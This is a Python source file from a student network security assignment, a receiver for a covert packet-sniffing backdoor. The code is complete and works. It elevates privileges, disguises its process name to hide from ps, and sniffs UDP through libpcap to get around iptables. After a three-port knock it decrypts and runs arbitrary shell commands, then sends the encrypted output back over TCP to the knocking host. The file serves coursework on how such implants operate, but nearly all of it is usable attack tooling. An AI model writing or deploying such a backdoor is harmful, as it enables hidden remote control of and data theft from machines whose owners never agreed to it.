#!/usr/bin/env python3

"""
----------------------------------------------------------------------------------------------------
COMP 8505 BTech Network Security & Applications Development
Assignment 3:
    - To become familiar with packet sniffing backdoors and to implement Linux backdoors.
Student:
    - Hung Yu (Angus) Lin, A01034410, Set 7J
----------------------------------------------------------------------------------------------------
receiver.py
    - Contains a packet sniffing backdoor that listens for port-knocking on 3 ports in a specific order.
    - If port-knocking successful, decrypt the payload from the last packet and execute the command and.
      save the output. Then start a TCP connection to the sender and return the payload.
----------------------------------------------------------------------------------------------------
"""

import setproctitle
import socket as sock
# from socket import *
from _thread import *
from os import setuid, setgid

import encryption
import subprocess
from scapy.all import *
from scapy.layers.inet import *
# Set scapy to use libpcap library to circumvent iptables rules.
from scapy.all import conf
conf.use_pcap = True

LOG_PATH = "log.txt"
CONFIGURATION_PATH = "configuration.txt"
# host_address = ""

receiver_addr = ''
port1 = 0
port2 = 0
port3 = 0
sender_addr = ''
sender_port = 0
port_knock_auth = ''
knock_order = 0


def read_configuration():
    """
    Reads configuration file.
    :return: list (config vars)
    """

    configuration = {
        'receiver_address': '',
        'sender_address': '',
        'receiver_port1': 0,
        'receiver_port2': 0,
        'receiver_port3': 0,
        'sender_port': 0,
        'port_knock_auth': '',
    }

    with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
        fp = [line.rstrip('\n') for line in file]
        for line in fp:
            if line.isspace() or line.startswith('#'):
                continue

            config_data = line.split('=')
            if config_data[0] in configuration:
                if config_data[0] in ('receiver_address', 'sender_address', 'port_knock_auth'):
                    configuration[config_data[0]] = config_data[1]
                elif config_data[0] in ('receiver_port1', 'receiver_port2', 'receiver_port3', 'sender_port'):
                    data = config_data[1]
                    if data.isdigit():
                        configuration[config_data[0]] = int(config_data[1])
                    else:
                        print("Invalid configuration, ports must be integers.")
                        exit()
                else:
                    print("Invalid configuration, unsupported variable detected.")
                    exit()

    return configuration


def run_commands(command):
    """
    Executes a shell command, then save and returns the output.
    :param command: str of shell command
    :return: str of output
    """
    # result = subprocess.run(['ls', '-l'], capture_output=True, text=True).stdout
    try:
        result2 = subprocess.run(command, capture_output=True, text=True, shell=True).stdout
    except Exception:
        result2 = "Failed to execute shell command. Shell command invalid or unknown on receiver system."
    print(result2)
    return result2


def start_backdoor():
    """
    Initialize the packet sniffing backdoor. Elevate privileges, sets up configurations, and starts sniff.
    :return: None
    """
    print("Starting Receiver.")

    # Elevate privileges.
    setuid(0)
    setgid(0)

    # Change process name
    try:
        # Gets last column of ps (process status), the process names.
        cmd1 = "ps -e -o command"
        # Gets each unique (process name), and number of duplicates
        cmd2 = "uniq -c"
        # Sort by ascending order of first field/column (num of dups).
        cmd3 = "sort -nr --key=1,1"
        # Keep the first line of output (highest dups)
        cmd4 = "head -n 1"
        # Removes the first column (# of dups)
        cmd5 = "awk '{$1=\"\"}1'"
        # Removes the leading space delimiter after cutting out first column
        cmd6 = "awk '{$1=$1}1"
        # ps -e -o command | uniq -c | sort -nr --key=1,1 | head -n 1 | awk '{$1=""}1' | awk '{$1=$1}1'
        get_highest_dup_process_name = "ps -e -o command | uniq -c | sort -nr --key=1,1 | head -n 1 | awk '{$1=\"\"}1' | awk '{$1=$1}1' "
        output = run_commands(get_highest_dup_process_name)
        setproctitle.setproctitle(output)
    except Exception:
        # If failed, default to /bin/bash as process name.
        setproctitle.setproctitle("/bin/bash")

    # Generate encryption key if needed. Ensure both sender and receiver have same key.
    encryption.generate_key()

    # Read Configuration
    config = read_configuration()

    global receiver_addr
    global port1
    global port2
    global port3
    global sender_addr
    global sender_port
    global port_knock_auth

    receiver_addr = config['receiver_address']
    port1 = config['receiver_port1']
    port2 = config['receiver_port2']
    port3 = config['receiver_port3']
    # sender_addr = config['sender_address']
    sender_port = config['sender_port']
    port_knock_auth = config['port_knock_auth']

    # Start sniffing, callback function to process each packet.
    sniff(prn=process_sniff_pkt, filter="udp", store=0)
    # sniff_port_knock(receiver_addr, port1, port2, port3, sender_addr, sender_port, port_knock_auth)


def process_sniff_pkt(pkt):
    """
    Callback function that processes each packet sniffed for valid backdoor sequence.
    UDP packets must port knock port 1-3 in config file in the right order, while also containing
    the auth_string as payload specified in config file.
    If a valid port knock is detected, decrypt command from payload to execute.
    :param pkt: scapy packet
    :return: None
    """
    global knock_order

    ip_dst = pkt.payload.dst

    if ip_dst != receiver_addr:
        return

    dst_port = pkt.payload.payload.dport
    check_data = bytes(pkt.payload.payload.payload)
    try:
        encoded_input = check_data.decode("utf-8")
    except UnicodeDecodeError:
        # print("Unauthorized Non-unicode payload for backdoor.")
        return

    data = check_data.decode("utf-8")

    # if type(check_data) == bytes:
    #     print(f"Payload: {check_data.decode('utf-8')}")
    #     data = check_data.decode('utf-8')

    if knock_order == 0:
        if dst_port == port1 and data == port_knock_auth:
            print(f"First knock valid")
            knock_order = 1
        else:
            print(f"First knock Failed")
            knock_order = 0
    elif knock_order == 1:
        if dst_port == port2 and data == port_knock_auth:
            print(f"Second knock valid")
            knock_order = 2
        else:
            print(f"Second Knock Failed.")
            knock_order = 0
    elif knock_order == 2:
        final_payload = data.split('|')
        auth_string = final_payload[0]
        command = final_payload[1]
        address = pkt.payload.src
        if dst_port == port3 and auth_string == port_knock_auth:
            print(f"Third knock valid")
            print(f"Encrypted Cmd: {command}")
            decrypt_cmd = encryption.decrypt(command.encode('utf-8')).decode('utf-8')
            print(f"Cmd: {decrypt_cmd}")
            result = run_commands(decrypt_cmd)
            encrypted_data = encryption.encrypt(result.encode('utf-8')).decode('utf-8')
            send_command_output(encrypted_data, address, sender_port)
            knock_order = 0
        else:
            print(f"Third Knock Failed.")
            knock_order = 0

    # print(f"IP Dest: {ip_dst}")
    # print(f"Dst Port: {dst_port}")
    # print(data)


def send_command_output(data, address, port):
    """
    Create TCP socket connection to specified address/port and send the string data.
    :param data: str
    :param address: dst IP
    :param port: dst port
    :return: None
    """

    # Add short delay ensuring sender socket is ready.
    time.sleep(0.5)

    # IPv4 Socket connection to receiver.
    with sock.socket(sock.AF_INET, sock.SOCK_STREAM) as my_sock:
        my_sock.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
        my_sock.connect((address, port))
        my_sock.sendall(data.encode("utf-8"))


if __name__ == "__main__":
    try:
        start_backdoor()
    except KeyboardInterrupt as e:
        print("Receiver Shutdown")
        exit()


